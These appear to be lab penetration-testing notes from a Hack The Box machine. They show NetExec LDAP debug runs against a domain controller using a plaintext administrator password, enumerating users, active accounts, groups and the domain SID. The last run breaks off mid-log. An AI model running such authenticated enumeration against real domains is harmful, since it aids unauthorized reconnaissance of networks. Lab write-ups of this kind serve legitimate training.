## ldap
### --users-export 
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --users-export usres.txt --debug
[07:39:55] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False, users=None,                       
                    users_export='usres.txt', groups=None, computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')               
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
[07:39:56] DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f9396094d70>                                                                                                                                ldap.py:177
           DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[07:39:57] INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[07:39:57] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[07:39:59] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
[07:40:00] DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[07:40:01] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling users_export()                                                                                                                                                                                 connection.py:263
           DEBUG    Trying to dump all users                                                                                                                                                                                     ldap.py:662
           DEBUG    Search Filter=(sAMAccountType=805306368)                                                                                                                                                                     ldap.py:625
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               Enumerated 4 domain users: active.htb                                                                                                                    ldap.py:674
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                 ldap.py:675
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               Administrator                 2018-07-18 15:06:40 0        Built-in account for administering the computer/domain                                        ldap.py:682
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain                                      ldap.py:682
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               krbtgt                        2018-07-18 14:50:36 0        Key Distribution Center Service Account                                                       ldap.py:682
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               SVC_TGS                       2018-07-18 16:14:38 0                                                                                                      ldap.py:682
[07:40:01] INFO     LDAP        10.129.175.223  389    DC               Writing 4 local users to usres.txt                                                                                                                       ldap.py:685
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --active-users
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --active-users --debug
[07:46:47] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False, users=None,                       
                    users_export=None, groups=None, computers=False, dc_list=False, get_sid=False, active_users=[], gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')                        
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
[07:46:48] DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f7d6fe74d70>                                                                                                                                ldap.py:177
           DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[07:46:49] INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[07:46:49] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[07:46:51] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
[07:46:52] DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
           DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
[07:46:53] DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[07:46:53] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling active_users()                                                                                                                                                                                 connection.py:263
           DEBUG    Trying to dump all users                                                                                                                                                                                     ldap.py:796
           DEBUG    Search Filter=(sAMAccountType=805306368)                                                                                                                                                                     ldap.py:625
[07:46:53] INFO     LDAP        10.129.175.223  389    DC               Total records returned: 4, total 2 user(s) disabled                                                                                                      ldap.py:808
[07:46:53] INFO     LDAP        10.129.175.223  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                 ldap.py:809
[07:46:53] INFO     LDAP        10.129.175.223  389    DC               Administrator                 2018-07-18 15:06:40 0        Built-in account for administering the computer/domain                                        ldap.py:815
[07:46:53] INFO     LDAP        10.129.175.223  389    DC               SVC_TGS                       2018-07-18 16:14:38 0                                                                                                      ldap.py:815
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --groups
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --groups --debug
[07:50:08] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False, users=None,                       
                    users_export=None, groups='', computers=False, dc_list=False, get_sid=False, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')                        
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f2c7a694d70>                                                                                                                                ldap.py:177
[07:50:09] DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[07:50:10] INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[07:50:10] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[07:50:12] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
           DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
[07:50:13] DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
           DEBUG    Adding credentials: [{'id': 2, 'domain': 'active.htb', 'username': 'administrator', 'password': 'Ticketmaster1968', 'credtype': 'plaintext', 'pillaged_from_hostid': None}]                              database.py:155
[07:50:13] INFO     LDAP        10.129.175.223  389    DC               active.htb\administrator:Ticketmaster1968 (Pwn3d!)                                                                                                       ldap.py:440
           DEBUG    Calling command arguments                                                                                                                                                                              connection.py:241
           DEBUG    Calling groups()                                                                                                                                                                                       connection.py:263
           DEBUG    Search Filter=(objectCategory=group)                                                                                                                                                                         ldap.py:625
[07:50:14] DEBUG    Total of records returned 37                                                                                                                                                                                 ldap.py:703
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Administrators                           membercount: 3                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Users                                    membercount: 3                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Guests                                   membercount: 2                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Print Operators                          membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Backup Operators                         membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Replicator                               membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Remote Desktop Users                     membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Network Configuration Operators          membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Performance Monitor Users                membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Performance Log Users                    membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Distributed COM Users                    membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               IIS_IUSRS                                membercount: 1                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Cryptographic Operators                  membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Event Log Readers                        membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Certificate Service DCOM Access          membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Domain Computers                         membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Domain Controllers                       membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Schema Admins                            membercount: 1                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Enterprise Admins                        membercount: 1                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Cert Publishers                          membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Domain Admins                            membercount: 1                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Domain Users                             membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Domain Guests                            membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Group Policy Creator Owners              membercount: 1                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               RAS and IAS Servers                      membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Server Operators                         membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Account Operators                        membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Pre-Windows 2000 Compatible Access       membercount: 1                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Incoming Forest Trust Builders           membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Windows Authorization Access Group       membercount: 1                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Terminal Server License Servers          membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Allowed RODC Password Replication Group  membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Denied RODC Password Replication Group   membercount: 8                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Read-only Domain Controllers             membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               Enterprise Read-only Domain Controllers  membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               DnsAdmins                                membercount: 0                                                                                                  ldap.py:722
[07:50:14] INFO     LDAP        10.129.175.223  389    DC               DnsUpdateProxy                           membercount: 0                                                                                                  ldap.py:722
           DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
```


### --get-sid
```sh
└─$ netexec ldap 10.129.175.223 -u 'active.htb\administrator' -p 'Ticketmaster1968' --get-sid --debug 
[07:59:54] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
           DEBUG    PYTHON VERSION: 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0]                                                                                                                                          netexec.py:81
           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
                    protocol='ldap', target=['10.129.175.223'], username=['active.htb\\administrator'], password=['Ticketmaster1968'], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                
                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=None, module_options=[], list_modules=False, show_module_options=False, hash=[], port=389, domain=None,                          
                    local_auth=False, asreproast=None, kerberoasting=None, base_dn=None, query=None, find_delegation=False, trusted_for_delegation=False, password_not_required=False, admin_count=False, users=None,                       
                    users_export=None, groups=None, computers=False, dc_list=False, get_sid=True, active_users=None, gmsa=False, gmsa_convert_id=None, gmsa_decrypt_lsa=None, bloodhound=False, collection='Default')                       
           DEBUG    Protocol: ldap                                                                                                                                                                                            netexec.py:137
           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap.py                                                                                                                                       netexec.py:140
           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/ldap/database.py                                                                                                                           netexec.py:142
           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
           DEBUG    Protocol Object: <class 'protocol.ldap'>, type: <class 'type'>                                                                                                                                            netexec.py:145
           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/ldap.db                                                                                                                                                       netexec.py:150
           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
           DEBUG    Creating thread for <class 'protocol.ldap'>                                                                                                                                                                netexec.py:48
           INFO     Socket info: host=10.129.175.223, hostname=10.129.175.223, kerberos=False, ipv6=False, link-local ipv6=False                                                                                           connection.py:165
           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
           INFO     Connecting to ldap://10.129.175.223 with no baseDN                                                                                                                                                           ldap.py:173
           DEBUG    ldap_connection: <impacket.ldap.ldap.LDAPConnection object at 0x7f065fc58d70>                                                                                                                                ldap.py:177
[07:59:55] DEBUG    Target: DC.active.htb; target_domain: active.htb; base_dn: DC=active,DC=htb                                                                                                                                  ldap.py:212
           DEBUG    Created connection object                                                                                                                                                                              connection.py:232
[07:59:56] INFO     Error resolving hostname active.htb: [Errno -2] Name or service not known                                                                                                                              connection.py:192
           INFO     Resolved domain: active.htb with dns, kdcHost: None                                                                                                                                                          ldap.py:257
           DEBUG    Update Hosts: [{'id': 2, 'ip': '10.129.175.223', 'hostname': 'DC', 'domain': 'active.htb', 'os': 'Windows 7 / Server 2008 R2 Build 7601'}]                                                                database.py:92
           DEBUG    add_host() - Host IDs Updated: [2]                                                                                                                                                                       database.py:102
           DEBUG    Printing host info for LDAP                                                                                                                                                                                  ldap.py:272
[07:59:56] INFO     LDAP        10.129.175.223  389    DC               Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)                                                                                      ldap.py:276
           DEBUG    Trying to authenticate using plaintext with domain                                                                                                                                                     connection.py:497
           INFO     Connecting to ldap://DC.active.htb - DC=active,DC=htb - 10.129.175.223 [3]                                                                                                                                   ldap.py:432
[07:59:58] DEBUG    Search Filter=(userAccountControl:1.2.840.113556.1.4.803:=8192)                                                                                                                                              ldap.py:625
           DEBUG    Search                                                                                                                                                                                                       ldap.py:625
                    Filter=(|(objectSid=S-1-5-21-405608879-3187717380-1996298813-512)(objectSid=S-1-5-21-405608879-3187717380-1996298813-544)(objectSid=S-1-5-21-405608879-3187717380-1996298813-519)(objectSid=S-1-5-32-549)(ob            
                    jectSid=S-1-5-32-551))                                                                                                                                                                                                  
[07:59:59] DEBUG    Search Filter=(&(objectCategory=user)(sAMAccountName=administrator)(|(memberOf:1.2.840.113556.1.4.1941:=CN=Server Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Backup         ldap.py:625
                    Operators,CN=Builtin,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=active,DC=htb)(memberOf:1.2.840.113556.1.4.1941:=CN=Enterprise Admins,CN=Users,DC=active,DC=htb)))                
           DEBUG    Adding credential: active.htb/administrator:Ticketmaster1968                                                                                                                                                 ldap.py:436
